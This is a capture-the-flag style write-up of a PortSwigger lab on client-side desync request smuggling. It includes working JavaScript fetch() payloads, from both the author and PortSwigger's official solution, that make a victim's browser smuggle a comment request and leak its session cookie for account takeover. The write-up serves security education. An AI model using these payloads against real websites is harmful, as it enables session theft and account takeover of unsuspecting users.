# Client-side desync

**Category:** HTTP Request Smuggling
**Difficulty:** EXPERT
**Lab:** https://portswigger.net/web-security/request-smuggling/browser/client-side-desync/lab-client-side-desync

Every attack in this series so far has been something we, the attacker, execute directly against the target. Client-side desync flips that: the victim's own browser does the smuggling, triggered by nothing more than visiting a page we control. That makes it a meaningfully different threat model — there's no shared connection to poison in advance, because the victim's browser opens its own connection and desyncs it against itself.

## The Target

Requests to `/` redirect to `/en`. That's an unremarkable detail on its own, but combined with a server that turns out to ignore `Content-Length` on certain endpoints (a CL.0 condition, same underlying primitive as the CL.0 lab earlier in this series), it becomes the foundation for a browser-triggered desync. The lab also has a comment feature that becomes the capture gadget once the desync is confirmed.

## The Investigation

We first confirmed the CL.0 behavior directly: sending a `POST /` with `Content-Length` set to 1 or higher but an empty body, the server responded immediately rather than waiting for the body it claimed was coming — proof it's ignoring the declared length on this path. From there, the same smuggling-prefix-plus-follow-up-request pattern used throughout this series confirmed the desync produces a real 404 on demand.

The genuinely new part is replicating that server-side desync from inside a victim's browser rather than from our own tooling. Browsers enforce same-origin and CORS restrictions that a raw socket doesn't have to worry about, so the delivery mechanism has to work within `fetch()`'s constraints. The trick is triggering a CORS error deliberately: a `fetch()` call with `mode: 'cors'` against an endpoint that redirects without an `Access-Control-Allow-Origin` header fails with a CORS error rather than following the redirect — and critically, the browser still keeps the underlying TCP connection open when that happens, because the connection itself succeeded even though the cross-origin policy blocked reading the response. Catching that failure and immediately firing a second `fetch()` reuses the same connection, delivering the second request right after the smuggled prefix from the first — replicating the exact "smuggle, then follow-up on the same connection" pattern from every server-side lab, except now both requests originate from the victim's own browser.

The exploitable gadget is the comment form: smuggling an oversized, incomplete `POST /en/post/comment` request means whatever real request follows on that same browser-established connection gets appended into the `comment=` parameter — and since it's the victim's own browser making that follow-up request, their session cookie travels with it automatically.

## The Exploit

Confirming the desync is triggerable from a browser at all:

```javascript
fetch('https://TARGET/vulnerable-endpoint', {
    method: 'POST',
    body: 'GET /hopefully404 HTTP/1.1\r\nFoo: x',
    mode: 'cors',
    credentials: 'include'
}).catch(() => {
    location = 'https://TARGET/'
})
```

The real exploit chain smuggles a complete comment-post request instead of a throwaway probe, sized to capture as much of the victim's next request as possible:

```javascript
fetch('https://TARGET', {
    method: 'POST',
    body: 'POST /en/post/comment HTTP/1.1\r\nHost: TARGET\r\nCookie: session=OUR_SESSION; _lab_analytics=OUR_COOKIE\r\nContent-Length: CAPTURE_LEN\r\nContent-Type: x-www-form-urlencoded\r\nConnection: keep-alive\r\n\r\ncsrf=TOKEN&postId=1&name=wiener&email=wiener@web-security-academy.net&website=https://ginandjuice.shop&comment=',
    mode: 'cors',
    credentials: 'include',
}).catch(() => {
    fetch('https://TARGET/capture-me', {
        mode: 'no-cors',
        credentials: 'include'
    })
})
```

We hosted this on the exploit server and delivered it to the lab's simulated victim. Because `CAPTURE_LEN` has to be tuned — long enough to swallow a meaningful slice of the victim's follow-up request, short enough not to run past it entirely — we tried several values (800, 600, 500, 900, 1000 bytes) until one produced a readable capture. Once the victim's browser executed our script, their next request (to `/capture-me`, triggered by our own `.catch()` handler) got appended into the smuggled comment, landing their session cookie directly in a public comment on the blog post. We read it from there and used it to load `/my-account` under the victim's identity, confirming account takeover.

## Comparing Notes: PortSwigger's Official Solution

PortSwigger's solution builds up the exact same chain in the same order: confirm CL.0 on `/` manually in Burp, confirm the desync with a smuggled 404 probe sent as a tab-group sequence, replicate it from a genuine browser console using `fetch()` with the identical CORS-error-then-catch pattern, then combine it with the comment-capture gadget and deliver it via the exploit server:

```javascript
fetch('https://YOUR-LAB-ID.h1-web-security-academy.net', {
        method: 'POST',
        body: 'POST /en/post/comment HTTP/1.1\r\nHost: YOUR-LAB-ID.h1-web-security-academy.net\r\nCookie: session=YOUR-SESSION-COOKIE; _lab_analytics=YOUR-LAB-COOKIE\r\nContent-Length: NUMBER-OF-BYTES-TO-CAPTURE\r\nContent-Type: x-www-form-urlencoded\r\nConnection: keep-alive\r\n\r\ncsrf=YOUR-CSRF-TOKEN&postId=YOUR-POST-ID&name=wiener&email=wiener@web-security-academy.net&website=https://portswigger.net&comment=',
        mode: 'cors',
        credentials: 'include',
    }).catch(() => {
        fetch('https://YOUR-LAB-ID.h1-web-security-academy.net/capture-me', {
        mode: 'no-cors',
        credentials: 'include'
    })
})
```

This is essentially the same script we used, down to the `mode: 'cors'` plus `.catch()` pattern and the comment-form capture gadget. The one genuinely useful thing their walkthrough calls out that our own process discovered through trial rather than instruction is the explicit note that the capture `Content-Length` "must be longer than the body of your `POST /en/post/comment` request prefix, but shorter than the follow-up request" — which is precisely why sweeping several candidate lengths was necessary rather than picking one value and expecting it to work first try. There isn't a meaningful technique divergence in this lab; the delivery difference between "test manually in Burp's browser, then paste into a real Chrome console" and "run the equivalent logic from a Python-driven request/response harness before handing the same JS off to the exploit server" is more about workflow than substance.

## What This Teaches Us

Client-side desync is the clearest demonstration in this entire series that request smuggling isn't purely a server-infrastructure problem — the same underlying CL.0 discrepancy that we could exploit directly from a raw socket is just as exploitable from inside a browser's own networking stack, provided we understand which CORS behaviors leave a connection alive after a blocked response. It also raises the stakes of any CL.0 finding considerably: a vulnerability that "only" requires direct attacker access to exploit becomes a zero-click, mass-distributable attack the moment it can be triggered from a page a victim merely visits, since the victim does all the smuggling themselves without ever suspecting anything was wrong.
